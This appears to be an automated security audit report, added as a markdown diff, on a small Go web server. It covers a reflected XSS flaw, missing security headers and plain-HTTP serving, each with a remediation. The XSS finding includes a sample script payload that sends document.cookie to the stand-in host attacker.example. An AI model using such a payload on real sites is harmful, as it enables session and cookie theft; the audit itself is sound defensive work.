@@ -1,0 +1,187 @@
+**Pass 1 — Triage complete.** Single Go file, stdlib only. One dynamic endpoint: `GET /greet?name=` with user-controlled input flowing directly into an HTML response. No auth, no crypto, no DB. Now running Pass 2 deep scan and Pass 3 validation.
+
+---
+
+## Finding 1: Reflected Cross-Site Scripting (XSS)
+
+**File:** `main.go`
+**Lines:** 21–25
+**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
+**OWASP Category:** A03:2021 – Injection
+**Priority:** P1
+**Severity:** MEDIUM
+**Confidence:** HIGH
+
+### Vulnerable Code
+```go
+http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
+    name := r.URL.Query().Get("name")
+    response := fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
+    fmt.Fprint(w, response)
+})
+```
+
+### Description
+The `name` query parameter is read from `r.URL.Query().Get("name")` — a fully attacker-controlled value — and interpolated raw into an HTML string via `fmt.Sprintf`. Go's `net/http` will content-sniff the first write and emit `Content-Type: text/html; charset=utf-8`, so browsers will parse and execute injected markup. Any script tag, event handler, or HTML element an attacker embeds in `name` will execute in the victim's browser under the application's origin. This enables session cookie theft (when `HttpOnly` is absent), credential harvesting, UI redirection, and arbitrary script execution against any user who clicks a crafted link.
+
+### Prioritization
+This is the single highest-priority finding. It is directly reachable with zero preconditions, trivially exploitable, and produces a classic reflected XSS impact (code execution in victim browser). No higher-priority finding exists in this codebase.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Victim must click an attacker-crafted URL (or visit a page that loads it). No authentication required — the endpoint is public.
+- **Uncertainty Boundary:** Impact scope depends on what other session state/cookies the application sets in a real deployment. In the current code there are no cookies, but any cookies set by other components would be at risk.
+
+**Concrete attacker input:**
+```
+GET /greet?name=<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
+```
+Response served to victim:
+```html
+<html><body><h1>Hello, <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>!</h1></body></html>
+```
+
+**Counterfactual:** If `html.EscapeString(name)` were applied before interpolation, or if `html/template` with automatic context-aware escaping were used, this finding would not be valid.
+
+### Remediation
+Replace `fmt.Sprintf` HTML construction with Go's `html/template` package, which applies context-aware HTML escaping automatically:
+
+```go
+import (
+    "html/template"
+    "net/http"
+)
+
+var greetTmpl = template.Must(template.New("greet").Parse(
+    `<html><body><h1>Hello, {{.}}!</h1></body></html>`,
+))
+
+http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
+    name := r.URL.Query().Get("name")
+    greetTmpl.Execute(w, name)
+})
+```
+
+`html/template` automatically escapes `<`, `>`, `"`, `'`, and `&` within HTML context, converting injected markup to inert text. Do **not** use `text/template` — it has the same API but performs no HTML escaping.
+
+### References
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
+- [Go `html/template` docs](https://pkg.go.dev/html/template)
+
+---
+
+## Finding 2: Missing HTTP Security Headers
+
+**File:** `main.go`
+**Lines:** 8–29 (all handlers)
+**CWE:** CWE-693 — Protection Mechanism Failure
+**OWASP Category:** A05:2021 – Security Misconfiguration
+**Priority:** P3
+**Severity:** LOW
+**Confidence:** HIGH
+
+### Vulnerable Code
+```go
+http.HandleFunc("/greet", func(w http.ResponseWriter, r *http.Request) {
+    name := r.URL.Query().Get("name")
+    response := fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
+    fmt.Fprint(w, response)
+})
+// No security headers set on any handler or via middleware
+```
+
+### Description
+None of the response handlers set defensive HTTP security headers. The absence of `Content-Security-Policy` eliminates the browser-side backstop that would block or restrict inline script execution, directly amplifying Finding 1's XSS impact. Missing `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP) allows the application to be embedded in attacker-controlled frames, enabling clickjacking. Missing `X-Content-Type-Options: nosniff` permits MIME-type confusion attacks on responses.
+
+### Prioritization
+Lower priority than Finding 1 (these headers are defense-in-depth, not primary controls). Remediate Finding 1 first. That said, `Content-Security-Policy` in particular would materially limit XSS impact.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Exploitability is indirect — these missing headers amplify other vulnerabilities rather than being independently exploitable.
+- **Uncertainty Boundary:** Impact depends on browser behavior and deployment context (reverse proxy may add headers).
+
+### Remediation
+Add a middleware wrapper that injects security headers on every response:
+
+```go
+func securityHeaders(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set("Content-Security-Policy", "default-src 'none'; script-src 'none'")
+        w.Header().Set("X-Content-Type-Options", "nosniff")
+        w.Header().Set("X-Frame-Options", "DENY")
+        w.Header().Set("Referrer-Policy", "no-referrer")
+        next.ServeHTTP(w, r)
+    })
+}
+
+// In main():
+mux := http.NewServeMux()
+// ... register handlers on mux ...
+http.ListenAndServe(":8080", securityHeaders(mux))
+```
+
+A strict `Content-Security-Policy` that forbids inline scripts (`script-src 'none'`) would prevent XSS execution even if Finding 1 is not yet fixed.
+
+### References
+- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
+- [CWE-693](https://cwe.mitre.org/data/definitions/693.html)
+
+---
+
+## Finding 3: Server Listening on Plain HTTP
+
+**File:** `main.go`
+**Lines:** 28
+**CWE:** CWE-319 — Cleartext Transmission of Sensitive Information
+**OWASP Category:** A02:2021 – Cryptographic Failures
+**Priority:** P3
+**Severity:** INFO
+**Confidence:** LOW
+
+### Vulnerable Code
+```go
+http.ListenAndServe(":8080", nil)
+```
+
+### Description
+The server binds to plain HTTP with no TLS. Any data exchanged — including the `name` parameter reflected in responses — traverses the network in cleartext, subject to passive interception and active manipulation by on-path attackers. In a production deployment, injected `name` values could be modified in transit, and any session cookies set by other components would be exposed.
+
+### Prioritization
+Lowest priority in this codebase. No sensitive data is currently handled by the application as written, and this is often delegated to a TLS-terminating reverse proxy in real deployments.
+
+### Exploitability Notes
+- **Exploit Preconditions:** Attacker must have network access between client and server (same LAN, ISP-level, or compromised intermediary).
+- **Uncertainty Boundary:** If a TLS-terminating proxy (nginx, Caddy, load balancer) sits in front, risk is contained to the proxy–app segment.
+
+### Remediation
+Use `http.ListenAndServeTLS` if terminating TLS at the application:
+
+```go
+http.ListenAndServeTLS(":8443", "cert.pem", "key.pem", nil)
+```
+
+Or, for managed TLS via Let's Encrypt, use `golang.org/x/crypto/acme/autocert`. In practice, delegating TLS termination to a reverse proxy (nginx, Caddy) and binding the Go server to `127.0.0.1:8080` is also acceptable.
+
+### References
+- [CWE-319](https://cwe.mitre.org/data/definitions/319.html)
+
+---
+
+```
+## Scan Summary
+
+| Metric         | Value |
+|----------------|-------|
+| Files Analyzed | 1     |
+| Total Findings | 3     |
+| Critical       | 0     |
+| High           | 0     |
+| Medium         | 1     |
+| Low            | 1     |
+| Info           | 1     |
+
+### Key Risks
+The dominant risk is a reflected XSS vulnerability on the `/greet` endpoint (Finding 1) where unsanitized query-parameter input is interpolated raw into an HTML response — any user who clicks a crafted URL is subject to arbitrary script execution in their browser. The missing security headers (Finding 2) compound this by removing the browser-side CSP backstop that could otherwise block script injection even when Finding 1 is present.
+```
+
+**Prioritization Notes:** Findings are ordered by exploitability and directness of attacker-controlled sink: Finding 1 has a trivial, zero-precondition exploit path; Findings 2–3 are defense-in-depth gaps that have no standalone exploit path but raise the ceiling of damage from Finding 1.
